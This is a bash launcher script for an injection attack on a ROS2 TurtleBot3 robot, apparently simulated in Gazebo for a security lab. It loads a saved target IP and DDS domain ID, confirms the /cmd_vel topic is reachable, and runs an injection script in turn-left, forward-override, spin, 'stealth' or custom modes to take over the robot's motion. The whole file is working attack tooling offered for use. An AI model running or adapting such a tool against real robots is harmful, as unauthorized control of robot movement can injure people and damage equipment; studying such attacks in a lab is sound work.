#!/bin/bash
# Launch network attack from attacker machine
# Make sure you've run setup_attacker_machine.sh first

echo "=========================================="
echo "Network Attack Launcher"
echo "=========================================="
echo ""

# Setup ROS2 environment
if [ -z "$ROS_DISTRO" ]; then
    source /opt/ros/jazzy/setup.bash 2>/dev/null || source /opt/ros/humble/setup.bash 2>/dev/null
fi
export TURTLEBOT3_MODEL=burger

# Load saved configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NETWORK_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

if [ -f "$NETWORK_DIR/target_ip.txt" ]; then
    target_ip=$(cat "$NETWORK_DIR/target_ip.txt")
    domain_id=$(cat "$NETWORK_DIR/target_domain_id.txt" 2>/dev/null || echo "0")
    export ROS_DOMAIN_ID=$domain_id
    
    # Load DDS config if exists
    if [ -f "$NETWORK_DIR/dds_attack_config.xml" ]; then
        export CYCLONEDDS_URI=file://$NETWORK_DIR/dds_attack_config.xml
    fi
    
    echo "Target: $target_ip (Domain ID: $domain_id)"
else
    echo "Error: Configuration not found!"
    echo "Please run setup_attacker_machine.sh first"
    exit 1
fi
echo ""

# Check if target is reachable
echo "Verifying connection to target..."
if ros2 topic list 2>/dev/null | grep -q cmd_vel; then
    echo "Target is reachable - /cmd_vel topic found"
else
    echo "Warning: /cmd_vel topic not found"
    echo "Make sure target machine is running Gazebo"
    read -p "Continue anyway? [y/N]: " continue_anyway
    if [ "$continue_anyway" != "y" ]; then
        exit 1
    fi
fi
echo ""

# Attack options
echo "Select attack type:"
echo "  1) Turn left (default)"
echo "  2) Override (forward)"
echo "  3) Spin"
echo "  4) Stealth"
echo "  5) Custom"
read -p "Enter choice [1-5]: " attack_choice

case $attack_choice in
    1)
        ATTACK_TYPE="turn_left"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--angular-speed 0.5"
        ;;
    2)
        ATTACK_TYPE="override"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--speed 0.5"
        ;;
    3)
        ATTACK_TYPE="spin"
        ATTACK_FREQ=30
        ATTACK_DURATION=10
        EXTRA_ARGS="--angular-speed 2.0"
        ;;
    4)
        ATTACK_TYPE="stealth"
        ATTACK_FREQ=25
        ATTACK_DURATION=30
        EXTRA_ARGS="--speed 0.3"
        ;;
    5)
        read -p "Attack type (turn_left/override/spin/stealth): " ATTACK_TYPE
        read -p "Frequency (Hz): " ATTACK_FREQ
        read -p "Duration (seconds): " ATTACK_DURATION
        EXTRA_ARGS=""
        ;;
    *)
        ATTACK_TYPE="turn_left"
        ATTACK_FREQ=50
        ATTACK_DURATION=15
        EXTRA_ARGS="--angular-speed 0.5"
        ;;
esac

echo ""
echo "=========================================="
echo "Launching Attack!"
echo "=========================================="
echo "Attack type: $ATTACK_TYPE"
echo "Frequency: $ATTACK_FREQ Hz"
echo "Duration: $ATTACK_DURATION seconds"
echo "Target: $target_ip"
echo ""
echo "Starting in 3 seconds..."
sleep 3
echo ""

# Get path to injection_attack.py
INJECTION_SCRIPT="$(cd "$SCRIPT_DIR/../../scripts" && pwd)/injection_attack.py"

if [ ! -f "$INJECTION_SCRIPT" ]; then
    echo "Error: injection_attack.py not found at $INJECTION_SCRIPT"
    exit 1
fi

# Launch attack
python3 "$INJECTION_SCRIPT" \
    --attack-type "$ATTACK_TYPE" \
    --frequency "$ATTACK_FREQ" \
    --duration "$ATTACK_DURATION" \
    --node-name "network_attacker" \
    $EXTRA_ARGS

echo ""
echo "=========================================="
echo "Attack completed!"
echo "=========================================="

